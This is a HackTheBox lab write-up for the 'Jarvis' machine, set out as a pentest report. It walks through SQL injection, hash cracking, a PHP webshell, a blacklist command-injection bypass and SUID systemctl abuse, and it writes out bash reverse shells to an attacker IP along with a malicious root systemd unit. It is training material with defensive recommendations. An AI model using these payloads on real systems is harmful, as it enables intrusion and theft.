---
layout: writeup
title: "Jarvis"
platform: HTB
os: Linux
difficulty: medium
date: 2026-03-12
description: "SQL injection to RCE, command injection bypass for lateral movement, and systemctl SUID exploitation for root."
techniques:
  - "SQL injection (Union-based)"
  - "phpMyAdmin CVE-2018-12613 LFI"
  - "Command injection bypass"
  - "SUID systemctl privilege escalation"
cve: 
  - "CVE-2018-12613"
---

# Jarvis — Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Medium` \
> **Date:** 2026-03-12 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

The "Jarvis" machine was found to contain multiple critical vulnerabilities allowing complete system compromise. An unauthenticated attacker could exploit SQL injection in a hotel booking system to extract database credentials, gain webshell access via phpMyAdmin, laterally move to user `pepper` through command injection filter bypass, and escalate to root via a misconfigured SUID binary. Immediate remediation of input validation failures and SUID binary review is recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Jarvis"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access (pepper)
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain
```
Nmap → SQLi (room.php) → MySQL hash crack → phpMyAdmin LFI → Webshell → Command injection bypass (simpler.py) → pepper → SUID systemctl → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `curl` | Manual SQL injection exploitation |
| `john` | MySQL hash cracking |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilization |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV 10.129.229.137
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.4p1 Debian | Standard config |
| 80 | HTTP | Apache 2.4.25 (Debian) | Stark Hotel website |

**Key Observations:**
- Web application with PHP backend (PHPSESSID cookie detected)
- httponly flag NOT set on session cookies
- Hostname disclosure: `supersecurehotel.htb`, `logger.htb`

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, `curl`, manual inspection

**Findings:**
- `/phpmyadmin/` - phpMyAdmin 4.8.0 (vulnerable version!)
- `/room.php?cod=[1-6]` - Room booking system with dynamic parameters
- Main site: hotel booking application with room listings

**Directory enumeration revealed:**
```
/phpmyadmin (Status: 301)
/css, /images, /js, /fonts, /sass (static assets)
```

**phpMyAdmin version detection:**
```bash
curl -s http://10.129.229.137/phpmyadmin/ | grep -i version
# Result: PMA_VERSION:"4.8.0"
```

### 5.2 SQL Injection Discovery

**Testing room.php parameter:**
```bash
curl 'http://10.129.229.137/room.php?cod=1'  # Valid response
curl "http://10.129.229.137/room.php?cod=1'" # Empty fields (SQLi confirmed!)
```

**WAF Detection:**
- Requests with spaces in payloads triggered 90-second ban: "Hey you have been banned for 90 seconds, don't be bad"
- Bypass: Use `+` instead of spaces in payloads

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Union-based SQL injection  
**Location:** `/room.php?cod=` parameter  
**Reasoning:** Single quote caused empty output (broken query), ORDER BY commands executed without errors, indicating injectable parameter with weak input validation.

### 6.2 Exploitation

**Step 1: Enumerate database structure**
```bash
# Database enumeration (using + for spaces to bypass WAF)
curl -s 'http://10.129.229.137/room.php?cod=-1+UNION+SELECT+1,CONCAT("DB:",database(),"|USER:",user(),"|VER:",version()),3,4,5,6,7--+-' | grep -oP '<h3><a[^>]*>\K[^<]+'

# Result: DB:hotel|USER:DBadmin@localhost|VER:10.1.48-MariaDB-0+deb9u2
```

**Step 2: Extract password hashes**
```bash
# Dump mysql.user table
curl -s 'http://10.129.229.137/room.php?cod=-1+UNION+SELECT+1,group_concat(user,0x3a,password),3,4,5,6,7+FROM+mysql.user--+-' | grep -oP '<h3><a[^>]*>\K[^<]+'

# Result: DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```

**Step 3: Crack MySQL hash**
```bash
echo '*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hash.txt
john --format=mysql-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Cracked: imissyou
```

**Step 4: phpMyAdmin access & webshell deployment**

Authenticated to phpMyAdmin as `DBadmin:imissyou` and executed SQL query to create webshell:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

**Step 5: Establish reverse shell**
```bash
# On attacker machine
nc -lvnp 4444

# Trigger reverse shell via webshell
curl "http://10.129.229.137/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.74/4444+0>%261'"
```

**Result:** User-level access obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data`  
**To:** `pepper`

**Method:**

Discovered sudo privilege allowing www-data to execute `/var/www/Admin-Utilities/simpler.py` as pepper:
```bash
sudo -l
# Output: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

**Vulnerability Analysis:**

The `simpler.py` script contained a command injection vulnerability in the `exec_ping()` function:
```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

**Bypass:** Blacklist incomplete — `$()` command substitution NOT filtered!

**Exploitation:**
```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# When prompted: $(cat /home/pepper/user.txt)
# Output in error: ping: 39c427915bae6b1bb1f11e53dc53c538: Temporary failure
```

User flag captured! To obtain proper shell as pepper, created SUID wrapper:
```bash
# As www-data via command injection:
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Input: $(cp /bin/bash /tmp/pbash)

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Input: $(chmod 4755 /tmp/pbash)

# Then execute:
/tmp/pbash -p
whoami  # pepper
```

**Result:** Access obtained as `pepper`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — showed www-data privileges (not pepper's)
- [x] SUID binaries — `find / -perm -4000 2>/dev/null`
- [ ] Cron jobs
- [ ] Capabilities
- [ ] Running processes

**Key Findings:**

SUID binary discovery:
```bash
find / -perm -4000 -type f 2>/dev/null
# Critical: /bin/systemctl (SUID root, executable by pepper)
```
```bash
ls -la /bin/systemctl
-rwsr-x--- 1 root pepper 174520 Jun 29 2022 /bin/systemctl
```

### 8.2 Escalation Vector

**Vector:** SUID systemctl exploitation  
**Root Cause:** systemctl binary misconfigured with SUID bit, allowing pepper to manipulate systemd services running as root

**Reference:** [A1vinSmith's systemctl privesc gist](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

**Exploitation:**

Created malicious systemd service for reverse shell:
```bash
cd /dev/shm
cat << EOF > rootrevshell.service
[Unit]
Description=privesc

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.74/5353 0>&1'

[Install]
WantedBy=multi-user.target
EOF

# Link service
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Input: $(/bin/systemctl link /dev/shm/rootrevshell.service)

# Start service (triggers root reverse shell)
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Input: $(/bin/systemctl start rootrevshell)
```

**Listener:**
```bash
nc -lvnp 5353
# Connection received from root!
```

**Result:** Root/system-level access achieved.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | SQL Injection - Union-based | 🔴 Critical | `/room.php?cod=` parameter |
| 2 | Outdated phpMyAdmin with known CVE | 🟠 High | `/phpmyadmin/` (v4.8.0) |
| 3 | Weak MySQL credentials | 🟠 High | Database user DBadmin |
| 4 | Command injection - blacklist bypass | 🔴 Critical | `/var/www/Admin-Utilities/simpler.py` |
| 5 | SUID systemctl misconfiguration | 🔴 Critical | `/bin/systemctl` |
| 6 | httponly flag not set on cookies | 🔵 Low | Session cookies |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual SQL queries with UNION statements in web logs
- Multiple failed authentication attempts to phpMyAdmin
- File creation in `/var/www/html/` (shell.php)
- Outbound connections from web server to external IPs on non-standard ports
- systemd service creation/modification by non-root users
- Execution of `/var/www/Admin-Utilities/simpler.py` with suspicious input patterns

### 10.2 Security Weaknesses

- **No input validation:** SQL injection due to unsanitized user input
- **Outdated software:** phpMyAdmin 4.8.0 has public exploits (CVE-2018-12613)
- **Weak credentials:** Easily cracked password hash in rockyou.txt
- **Blacklist filtering:** Incomplete forbidden character list allows bypass
- **Excessive SUID permissions:** systemctl should not be SUID root
- **Sudo misconfiguration:** www-data shouldn't execute utilities as other users

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove SUID bit from `/bin/systemctl` | Critical privesc vector |
| Immediate | Implement prepared statements/parameterized queries | SQL injection vulnerability |
| Short-term | Update phpMyAdmin to latest version | CVE-2018-12613 |
| Short-term | Enforce strong password policy & rotate DB credentials | Weak MySQL password |
| Short-term | Replace blacklist with whitelist in `simpler.py` | Command injection bypass |
| Long-term | Implement WAF with stricter rules | Current WAF easily bypassed |
| Long-term | Principle of least privilege for sudo | www-data has unnecessary privileges |
| Long-term | Enable httponly and secure flags on cookies | Session hijacking risk |

---

## 11. Lessons Learned

- **WAF bypass techniques:** Discovered that simple character substitution (`+` for space) can bypass rate-limiting WAFs. Real-world applications may have similar oversights.

- **Blacklist vs whitelist:** The `simpler.py` script demonstrated why blacklists fail — it blocked `;`, `-`, `|`, `&`, `` ` ``, `||` but forgot `$()`. Whitelists are always more secure for input validation.

- **Command injection requires creativity:** When direct methods fail (dashes blocked, semicolons blocked), indirect methods work — creating files, using command substitution, leveraging existing binaries.

- **SUID binaries are privilege escalation goldmines:** Always check not just WHICH binaries are SUID, but also WHO can execute them. `/bin/systemctl` being SUID AND executable by pepper was the perfect storm.

- **Tool limitations:** sqlmap failed due to WAF behavior, reinforcing that manual exploitation skills are essential when automated tools hit roadblocks.

- **Chaining exploits:** This box required chaining five separate vulnerabilities (SQLi → hash crack → LFI → command injection → SUID) — real-world pentests often require similar chains rather than single-exploit wins.

---

*End of Report*  
*Classification: Public — flags and sensitive values omitted*
